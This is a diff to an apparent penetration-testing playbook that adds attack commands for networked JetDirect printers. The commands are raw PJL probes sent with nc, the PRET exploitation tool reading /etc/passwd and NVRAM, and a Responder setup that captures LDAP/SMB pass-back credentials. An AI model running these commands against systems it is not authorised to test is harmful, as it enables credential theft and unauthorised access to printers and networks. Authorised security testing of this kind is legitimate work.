@@ -5125,13 +5125,18 @@ _STEP_COMMANDS = {
     },
     "jetdirect": {
         1: [
-            "python3 pret.py <RHOST> pjl",
+            "nmap -p9100 --script pjl-ready-message <RHOST>",
+            "printf '\\x1b%%-12345X@PJL INFO ID\\r\\n@PJL INFO STATUS\\r\\n\\x1b%%-12345X\\r\\n' | nc -q2 <RHOST> 9100   # raw ID/status",
+            "git clone https://github.com/RUB-NDS/PRET && python3 PRET/pret.py <RHOST> pjl",
+            "python3 PRET/pret.py <RHOST> ps   # PostScript mode — different filesystem access than PJL",
         ],
         2: [
-            "python3 pret.py <RHOST> pjl   # then: ls / get /etc/passwd / nvram dump",
+            "python3 PRET/pret.py <RHOST> pjl   # then: ls / get /etc/passwd / nvram dump",
+            "printf '\\x1b%%-12345X@PJL FSDIRLIST NAME=\"0:\\\\\" ENTRY=1 COUNT=999\\r\\n\\x1b%%-12345X\\r\\n' | nc -q2 <RHOST> 9100   # raw FS listing (fallback without PRET)",
         ],
         3: [
             "# extract stored LDAP/SMB pass-back creds and captured print jobs via PRET",
+            "sudo responder -I <IFACE>   # then, in the printer web-admin, point the LDAP/SMB address-book server at <LHOST> to capture the pass-back credentials",
         ],
         4: [
             "# HackTricks Printers: https://book.hacktricks.xyz/network-services-pentesting/9100-pjl",
